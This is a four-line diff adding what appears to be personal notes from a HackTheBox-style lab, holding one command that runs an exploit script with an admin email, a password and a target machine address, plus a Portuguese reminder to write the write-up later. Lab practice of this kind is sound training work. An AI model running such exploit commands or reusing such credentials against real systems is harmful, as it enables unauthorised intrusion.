@@ -1,0 +1,4 @@
+python3 exploit.py -u admin@htb.local -p baconandcheese -w http://MACHINE_IP/ -i IP
+
+
+Fazer Write up dps
